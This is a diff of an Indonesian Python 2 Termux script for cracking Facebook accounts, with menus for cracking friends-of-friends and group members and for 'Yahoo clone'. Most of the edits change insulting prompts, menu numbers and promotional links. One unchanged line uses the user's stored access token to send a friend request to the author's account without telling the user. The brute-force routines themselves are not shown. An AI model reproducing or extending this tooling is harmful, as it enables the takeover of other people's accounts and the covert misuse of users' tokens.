@@ -72,22 +72,22 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;91mSiapa nama pacar kamu kalau ga punya pacar paeh wh  ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;91mSiapa nama mu  ? \033[1;91m: \033[1;92m")
 	if nama =="":
 		print"\033[1;96m[!] \033[1;91mIsian ka bener"
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97Membuat tidak semudah menggunakan") 
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97Mmembuat tidak semudah menggunakan") 
                 time.sleep(1)
 		loginSC()
 		
 		
 def loginSC():
 	os.system('clear')
-	jalan("\033[1;96mSilahkan login SC nya dulu....jangan di salah gunakan && jangan di perjaual belikan info:JIKA AKUN FB KALIAN TIDAK INGIN KENA CP SEBELUM MNH LOGIN DI TERMUX LOGIN DLU DI OPERA MINI/BUAT FB BARU.NGERTI LU BANGSAT JANGAN BANYAK BACOT SUBSCRIBE CHANEL GW..! \n")
-        os.system('xdg-open https://wa.me/6283826516546 ')
+	jalan("\033[1;96mSilahkan login SC nya dulu....jangan di salah gunakan && jangan di perjaual belikan info:JIKA AKUN FB KALIAN TIDAK INGIN KENA CP SEBELUM MNH LOGIN DI TERMUX LOGIN DLU DI OPERA MINI/BUAT FB BARU.NGERTI LU BANGSAT JANGAN BANYAK BACOT..! \n")
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100051274201356 ')
 	username = raw_input("\033[1;91m[*] \033[1;91mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;97m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
 	if username =="Fadil" and password =="ID":
@@ -138,15 +138,14 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin berhasil sayang..'
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin berhasil COK..'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCxLFXgxj_U1SMlpK0cJ5KZw ')
-				menu()
+			        menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint 😅 puas")
+			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint 😅 sabar ya COK")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -191,30 +190,30 @@ def menu():
 	print "\x1b[1;97m2.\x1b[1;91m LIHAT DARI DAFTAR GRUP             "
 	print "\x1b[1;97m3.\x1b[1;97m INFORMASI AKUN              "
 	print "\x1b[1;97m4.\x1b[1;97m YAHOO CLONE               "
-	print "\n\x1b[1;91m0.\x1b[1;91m logout BRO            "
+	print "\n\x1b[1;91m0.\x1b[1;91m logout Njing            "
 	pilih()
 
 
 def pilih():
 	unikers = raw_input("\n\033[1;91m ╰──────>♡[]●>  \033[1;97m")
 	if unikers =="":
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mIsi dengan benar"
 		pilih()
-	elif unikers =="1":
+	elif unikers =="01":
 		super()
-	elif unikers =="2":
+	elif unikers =="02":
 		grupsaya()
-	elif unikers =="3":
+	elif unikers =="03":
 		informasi()
-	elif unikers =="4":
+	elif unikers =="04":
 		yahoo()
-	elif unikers =="0":
+	elif unikers =="00":
 		os.system('clear')
 		jalan('Menghapus token')
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mIsi dengan benar"
 		pilih()
 		
 		
@@ -235,13 +234,13 @@ def super():
 	print "\x1b[1;97m2.\x1b[1;91m CRACK TEMAN DARI TEMAN"
 	print "\x1b[1;97m3.\x1b[1;97m CRACK DARI GRUP"
 	print "\x1b[1;97m4.\x1b[1;97m CACK DARI FILE"
-	print "\n\x1b[1;91m0.\x1b[1;91mKeluar BANGSAT"
+	print "\n\x1b[1;91m0.\x1b[1;91mKeluar COK"
 	pilih_super()
 
 def pilih_super():
 	peak = raw_input("\n\033[1;97m╰──────>♡[]●>  \033[1;97m")
 	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mIsi dengan benar"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
